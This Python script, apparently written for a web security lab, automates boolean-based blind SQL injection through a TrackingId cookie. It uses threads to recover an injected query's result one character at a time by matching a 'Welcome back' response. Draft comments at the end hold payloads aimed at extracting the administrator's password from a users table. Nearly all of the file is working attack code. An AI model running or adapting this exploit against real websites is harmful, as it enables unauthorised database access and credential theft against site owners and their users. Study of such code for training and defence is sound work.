import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
"""
IPython (англ. Interactive Python)
через него запустили скрипт
import string
string.printable
"""
#что в итоге нам выдало: 
#Out[2]: '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c' 
AVAIL_CHARS = string.printable 
#и переменная avail_char (доступные символы хранит в себе подобный response)
def format_length_query(inner_query, length):
    return f"xyz' or (select length(({inner_query}))={length})-- "


def format_char_query(inner_query, index, char):
    return f"xyz' or (Select substring(({inner_query}), {index}, 1)=chr({char}))-- "


def is_true(resp):
    if "Welcome back" in resp.text:
        return True
    return False


def format_request(url, outer_query):
    cookies = {
        "TrackingId": outer_query,
    }    
    request = requests.Request("GET", url, cookies=cookies)
    prepped = request.prepare()
    return prepped

#here
def determine_response_length(inner_query, url, no_proxy=False):
    log.info("determinging response length")
    sess = requests.Session()
    for i in range(1, 5):
        outer_query = format_length_query(inner_query, i)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_length = i
            log.info(f"Length of query response is {response_length}")
            return i


def determine_response_char(task):
    """
    chars = [ord(x) for x in AVAIL_CHARS]
    Это генератор списка (list comprehension), который:

    Проходит по каждому символу x из строки AVAIL_CHARS.
    Преобразует этот символ в его ASCII-код с помощью ord(x).
    Собирает все ASCII-коды в новый список.
    """
    sess = requests.Session()
    chars = [ord(x) for x in AVAIL_CHARS]
    for x in chars:
        outer_query = format_char_query(task["inner_query"], task["position"], x)
        prepped = format_request(task["url"], outer_query)
        if task["no_proxy"]:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp): #he
            task["result"] = str(chr(x))
            return task

def format_results(response_chars):
    results = [
        res["result"] for res in sorted(response_chars, key=lambda item: item["position"])
    ]
    return "".join(results)



def get_response_string(inner_query, url, no_proxy, num_threads):
    response_lenght = determine_response_length(inner_query, url, no_proxy) #here
    tasks = []
    for i in range(1, response_lenght + 1):
        result = {
            "position": i,
            "url": url, 
            "no_proxy": no_proxy, 
            "inner_query": inner_query,
            }
        tasks.append(result)    
    response_chars = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        results = [executor.submit(determine_response_char, task) for task in tasks]
        for f in concurrent.futures.as_completed(results):
            response_chars.append(f.result())
    return format_results(response_chars)       

def main(args):
    num_threads = 1
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    inner_query = "SELECT 'abcd'"
    response_string = get_response_string(
        inner_query, shop.base_url, shop.no_proxy, num_threads
        )
    log.info(f"Response is: {response_string}")
    
    
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
    
    
    
    
#------------------------------------------------------------------------------------------
#draft

#xyz' and (select 'a' from users where username = 'administrator' and length(password > 1)) = 'a'-- 
        
#xyz' or (select length('aaaa')=4)--       //true its return text "welcmoeback"

#xyz' or (select substring('abcd', 1,1) = 'a')--             // the same response (true)
# and botta my own builded payload:  xyz' or substring((select password from users where username = 'administrator')1,1) = '{char}'

   
    
"""
select password from users where username = 'administsrator'
inner query


return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
"""    
  